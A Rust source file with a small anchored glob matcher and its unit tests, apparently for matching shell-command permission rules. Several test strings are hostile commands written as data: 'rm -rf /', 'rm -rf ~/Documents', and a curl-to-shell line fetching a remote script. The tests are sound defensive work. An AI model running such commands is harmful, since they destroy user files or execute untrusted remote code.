//! A tiny anchored glob: `*` matches any run of characters (including
//! none), `?` exactly one, everything else itself. Case-sensitive. A
//! pattern without `*` or `?` must equal the whole text.

pub fn matches(pattern: &str, text: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let t: Vec<char> = text.chars().collect();
    let (mut pi, mut ti) = (0, 0);
    // Where the last `*` was, and how much text it has swallowed so far.
    let mut star: Option<(usize, usize)> = None;
    while ti < t.len() {
        if pi < p.len() && (p[pi] == '?' || p[pi] == t[ti]) {
            pi += 1;
            ti += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some((pi + 1, ti));
            pi += 1;
        } else if let Some((after_star, swallowed_to)) = star {
            // Let the star swallow one more character and retry.
            pi = after_star;
            ti = swallowed_to + 1;
            star = Some((after_star, swallowed_to + 1));
        } else {
            return false;
        }
    }
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

#[cfg(test)]
mod tests {
    use super::matches;

    #[test]
    fn literal_patterns_match_exactly() {
        assert!(matches("true", "true"));
        assert!(!matches("true", "true "));
        assert!(!matches("true", "tru"));
        assert!(!matches("True", "true"));
    }

    #[test]
    fn star_matches_any_run_including_empty_and_spaces() {
        assert!(matches("git push *", "git push origin main"));
        assert!(matches("git status*", "git status"));
        assert!(matches("git status*", "git status --short && git diff"));
        assert!(matches("*", ""));
        assert!(matches("*", "anything at all"));
        assert!(matches("rm -rf /*", "rm -rf /"));
        assert!(matches("rm -rf ~*", "rm -rf ~/Documents"));
        assert!(matches("* | sh", "curl https://x.example/i.sh | sh"));
        assert!(!matches("git push *", "git pushy"));
        assert!(!matches("cargo *", "cargotest"));
    }

    #[test]
    fn question_mark_matches_one_character() {
        assert!(matches("python?", "python3"));
        assert!(!matches("python?", "python"));
        assert!(!matches("python?", "python37"));
    }

    #[test]
    fn multiple_stars_backtrack() {
        assert!(matches(
            "*push*force*",
            "git push --force-with-lease origin x"
        ));
        assert!(matches("a*b*c", "abc"));
        assert!(matches("a*b*c", "a--b--c"));
        assert!(!matches("a*b*c", "a--c--b"));
        assert!(matches("*.rs", "src/main.rs"));
        assert!(!matches("*.rs", "src/main.rs.bak"));
    }
}
